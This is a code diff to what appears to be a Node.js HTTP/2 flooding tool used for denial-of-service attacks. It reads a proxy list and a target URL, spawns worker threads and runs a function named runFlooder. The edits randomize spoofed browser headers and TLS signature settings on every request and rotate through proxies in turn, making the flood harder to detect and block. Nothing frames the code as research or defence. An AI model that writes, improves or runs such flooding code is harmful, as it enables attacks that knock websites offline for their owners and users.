@@ -111,13 +111,9 @@ const rateHeaders = [
     { "user-agent": randstr(12) }
 ];
 
-var siga = sig[Math.floor(Math.random() * sig.length)];
-var ver = version[Math.floor(Math.random() * version.length)];
-var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
-var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
-var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
+let proxyIndex = 0;
 
 if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -180,13 +176,13 @@ headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
 headers[":scheme"] = "https";
-headers["sec-ch-ua"] = ver;
+headers["sec-ch-ua"] = version[Math.floor(Math.random() * version.length)];
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-ch-ua-mobile"] = "?0";
-headers["accept-encoding"] = encoding;
-headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
+headers["accept-language"] = lang_header[Math.floor(Math.random() * lang_header.length)];
 headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept;
+headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-site"] = "same-origin";
@@ -194,7 +190,8 @@ headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
-    const proxyAddr = randomElement(proxies);
+    const proxyAddr = proxies[proxyIndex];
+    proxyIndex = (proxyIndex + 1) % proxies.length;
     const parsedProxy = proxyAddr.split(":");
 
     const proxyOptions = {
@@ -219,7 +216,7 @@ function runFlooder() {
                 {
                     secure: true,
                     ALPNProtocols: ['h2'],
-                    sigals: siga,
+                    sigals: sig[Math.floor(Math.random() * sig.length)],
                     socket: connection,
                     ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
                     ecdhCurve: 'P-256:P-384',
